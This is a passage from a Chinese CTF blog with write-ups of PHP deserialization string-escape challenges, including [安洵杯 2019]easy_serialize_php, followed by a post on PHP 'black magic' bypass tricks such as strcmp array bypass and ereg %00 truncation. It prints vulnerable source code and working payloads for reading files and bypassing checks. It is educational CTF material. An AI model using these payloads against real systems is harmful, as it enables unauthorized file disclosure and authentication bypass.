<p><img src="https://img.npfs06.top/20210306095643.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>通过审计发现会将字符串中的<code>\</code>和<code>\\\\</code>    替换成下划线，也会将部分字符替换成hacker,这里细心点可以发现这些字符串里面只有where是5位的，其他都是6位的</p>
<hr>
<p>回到update.php页面，尝试上传文件，来到了profile.php页面，审计代码，发现这里有个反序列化操作，还有一个文件读取操作</p>
<p><img src="https://img.npfs06.top/20210306095655.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>其实看到这里，大概思路应该就有了，flag在config.php中，我们在上传页面参数被序列化，再经历一系列替换之后，再进行反序列化，同时还有文件读取</p>
<p>php反序列化字符串逃逸的常见套路，我们可以将config.php作为逃逸字符串，经过一系列变化后，读取出来</p>
<p>最终payload</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210306095712.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>上传后来到profile.php页面，读取源码，base64解密，即可得到flag</p>
<p>这里为什么要构造nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}其实如果看懂我上面写的<code>过滤后字符变多</code>这一模块后是很好理解的</p>
<p>filter函数会将where替换成hacker，字符数增加1，字符串膨胀</p>
<blockquote>
<p>“;}s:5:”photo”;s:10:”config.php”;}   </p>
</blockquote>
<p>这一部分一共34个字符，这也就以为这当我们构造34个where时，当where被替换成hacker之后，会多出34个字符，使得”;}s:5:”photo”;s:10:”config.php”;}  被向后推，从而替代了photo的序列化结果</p>
<p><strong>替换前</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">a</span>:<span class="number">4</span>&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">204</span>:<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;<span class="string">&quot;;s:39:&quot;</span>upload/<span class="number">804</span>f<span class="number">743824</span>c<span class="number">0451</span>b<span class="number">2</span>f<span class="number">60</span>d<span class="number">81</span>b<span class="number">63</span>b<span class="number">6</span>a<span class="number">900</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>替换后</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">a</span>:<span class="number">4</span>&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">204</span>:<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;<span class="string">&quot;;s:39:&quot;</span>upload/<span class="number">804</span>f<span class="number">743824</span>c<span class="number">0451</span>b<span class="number">2</span>f<span class="number">60</span>d<span class="number">81</span>b<span class="number">63</span>b<span class="number">6</span>a<span class="number">900</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a><strong>[安洵杯 2019]easy_serialize_php</strong></h2><p>这一题考察的是过滤后字符变少</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>具体过程我就不写了，参考上文<code>过滤后字符变少</code>板块，</p>
<p>本地测试脚本如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;L2QwZzNfZmxsbGxsbGFn&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] =<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;aa&quot;;s:2:&quot;ss&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>]=<span class="string">&#x27;ZDBnM19mMWFnLnBocA==&#x27;</span>;</span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serialize_info</span>;</span><br><span class="line"><span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<blockquote>
<p>GET   ?f=show_image</p>
</blockquote>
<blockquote>
<p>POST SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:2:”aa”;s:2:”ss”;}</p>
</blockquote>
<p>查看源码，$flag = ‘flag in /d0g3_fllllllag’;</p>
<p>所以构造</p>
<p>payload</p>
<blockquote>
<p>GET  ?f=show_image</p>
</blockquote>
<blockquote>
<p>POST   SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;s:2:”aa”;s:2:”ss”;}</p>
</blockquote>
<p>得到flag</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>php黑魔法</title>
    <url>/2020/04/08/php%E9%BB%91%E9%AD%94%E6%B3%95/</url>
    <content><![CDATA[<p>php中常见的黑魔法与其绕过方法</p>
<a id="more"></a>

<h1 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h1><p>若字符串以数字开头，则取开头数字作为转换结果，若无则输出0</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------- 弱比较黑魔法 -------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> == <span class="string">&quot;1abc&quot;</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == <span class="string">&quot;abc&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="string">&quot;0e132456789&quot;</span> == <span class="string">&quot;0e7124511451155&quot;</span>) &#123;</span><br><span class="line">			<span class="comment">#常见于md5弱比较绕过</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;两个&#x27;==&#x27;的弱比较成功&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="md5-sha1"><a href="#md5-sha1" class="headerlink" title="md5(),sha1()"></a>md5(),sha1()</h1><p>md5()是不能处理数组的，md5(数组)会返回null，两个null相等绕过<br>sha1()也是同理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------- md5(),sha1()黑魔法 -------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$md5_bug1</span>[]=<span class="number">1</span>) === md5(<span class="variable">$md5_bug2</span>[]=<span class="number">1</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span> (sha1(<span class="variable">$md5_bug1</span>[]=<span class="number">1</span>) === sha1(<span class="variable">$md5_bug2</span>[]=<span class="number">1</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;md5传入数组绕过成功&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h1><p>php会自动进行转换，比如16进制，科学计数法等，有时也用这点绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------- 转换黑魔法 -------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;0x1e240 自动转换10进制：&quot;</span>,<span class="number">0x1e240</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;123456 十进制数：&quot;</span>,<span class="number">123456</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1e240 科学计数法自动转换：&quot;</span>,<span class="number">1e240</span>;</span><br></pre></td></tr></table></figure>


<h1 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h1><p>int strcmp ( string $str1 , string $str2 )<br>参数 str1第一个字符串。str2第二个字符串。<br>如果 str1 小于 str2 返回 &lt; 0；<br>如果 str1 大于 str2 返回 &gt; 0；<br>如果两者相等，返回 0。</p>
<p>strcmp()函数只有在相等的情况下返回0。<br>php在5.3版本之前若传入的是一个非字符串类型数据，比如数组和对象，则会报错，但在报错的同时会返回0，那么我们传入一个数组，它会返回NULL，而判断使用了== ，但是NULL==0是bool(true)，这样就成功绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------- strcmp()黑魔法 -------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$strcmp_bug</span>[]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (@strcmp(<span class="variable">$strcmp_bug</span>, <span class="string">&quot;you_don&#x27;t_know_this_string&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;strcmp()数组黑魔法绕过成功&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$password</span>=<span class="string">&quot;***************&quot;</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span> (strcmp(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$password</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Right!!!login success&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wrong password..&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>只要我们$_POST[‘password’]是一个数组或者一个object即可</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">password</span>[]=<span class="keyword">admin</span></span><br></pre></td></tr></table></figure>


<h1 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h1><p>intval()转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。<br>即使出现无法转换的字符串，intval()不会报错而是返回0。<br>注：<br>在科学计数法字符串转换为数字时，如果 E 后面的数小于某个值会弄成 double 类型，再强制转换为 int 类型时可能会有奇妙的结果，测试发现某变量为 1e-1000 时已经可以触发这个漏洞绕过两个检查，使得某变量既大于 0 又不大于 0。<br>例如：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var_dump</span>((int)(&#x27;<span class="number">1</span>e-<span class="number">1000</span>&#x27;)&gt;<span class="number">0</span>);</span><br><span class="line"><span class="attribute">var_dump</span>(&#x27;<span class="number">1</span>e-<span class="number">1000</span>&#x27;&gt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">Command line <span class="selector-tag">code</span>:<span class="number">1</span>:</span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(true)</span></span></span><br><span class="line">Command line <span class="selector-tag">code</span>:<span class="number">1</span>:</span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(false)</span></span></span><br></pre></td></tr></table></figure>
<p>再入：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var_dump</span>((int)(&#x27;<span class="number">1</span>e-<span class="number">10</span>&#x27;)&gt;<span class="number">0</span>);</span><br><span class="line"><span class="attribute">var_dump</span>(&#x27;<span class="number">1</span>e-<span class="number">10</span>&#x27;&gt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">Command line <span class="selector-tag">code</span>:<span class="number">1</span>:</span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(true)</span></span></span><br><span class="line">Command line <span class="selector-tag">code</span>:<span class="number">1</span>:</span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(true)</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; ---------------- intval()黑魔法 -------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;2 的intval()转换结果：&quot;</span>,intval(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;3abcd 的intval()转换结果：&quot;</span>,intval(<span class="string">&#x27;3abcd&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;abcd 的intval()转换结果：&quot;</span>,intval(<span class="string">&#x27;abcd&#x27;</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$intval_bug</span> = <span class="string">&#x27;1e-1000&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)(<span class="variable">$intval_bug</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$intval_bug</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;intval()转换问题绕过成功&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h1><p>字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。<br>注：这里的%00是需要urldecode才可以截断的，这是url终止符，且%00长度是1不是3</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------- ereg()黑魔法 -------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$input</span> = urldecode(<span class="string">&#x27;1e8%00*-*&#x27;</span>);</span><br><span class="line"><span class="comment">// echo strlen($input); #7</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span> (@ereg (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>,<span class="variable">$input</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$input</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;输入只能是数字和字母！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;ereg()%00截断绕过成功&quot;</span>;   </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">   <span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;*-*&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">echo</span>(<span class="string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ereg函数存在NULL截断漏洞,可以%00截断，则不会读取后面的内容，可以绕过输入*-*<br>大小和长度限制可以利用科学计数法</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">password</span>=1e8%00*-*</span><br></pre></td></tr></table></figure>
<h1 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h1><p>当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过<br>16进制也可以绕过is_numeric()检验，可以用来绕过sql注入里的过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------- is_numeric()黑魔法 -------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$is_numeric1</span> = <span class="string">&quot;0123&quot;</span>;</span><br><span class="line"><span class="variable">$is_numeric2</span> = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=is_numeric(<span class="variable">$is_numeric1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$is_numeric2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$c</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (is_numeric(<span class="string">&#x27;    +.1234e5678&#x27;</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;is_numeric()连用漏洞绕过&quot;</span>;</span><br><span class="line">		<span class="comment"># 这样也能绕过检测……</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="switch"><a href="#switch" class="headerlink" title="switch()"></a>switch()</h1><p>当switch没有break时可以继续往下执行。<br>这里也有自动转换，比如$switch_bug = a,会当0执行，=1a，会当1执行……</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------- switch()黑魔法 -------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">@<span class="variable">$switch_bug</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ( <span class="variable">$switch_bug</span> )) &#123;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$switch_bug</span>) &#123;</span><br><span class="line"> 		<span class="keyword">case</span> <span class="number">0</span> :</span><br><span class="line"> 				<span class="keyword">echo</span> <span class="string">&#x27;你已经运行到了case0&#x27;</span>;</span><br><span class="line"> 				<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> 		<span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line"> 				<span class="keyword">echo</span> <span class="string">&#x27;你已经运行到了case1&#x27;</span>;</span><br><span class="line"> 				<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> 		<span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line"> 				<span class="keyword">echo</span> <span class="string">&#x27;你已经运行到了case2&#x27;</span>;</span><br><span class="line"> 				<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> 				<span class="keyword">echo</span> <span class="string">&quot;switch()没有break连续运行绕过成功&quot;</span>;</span><br><span class="line"> 				<span class="keyword">break</span>;</span><br><span class="line"> 		<span class="keyword">default</span> :</span><br><span class="line"> 				<span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line"> 				<span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


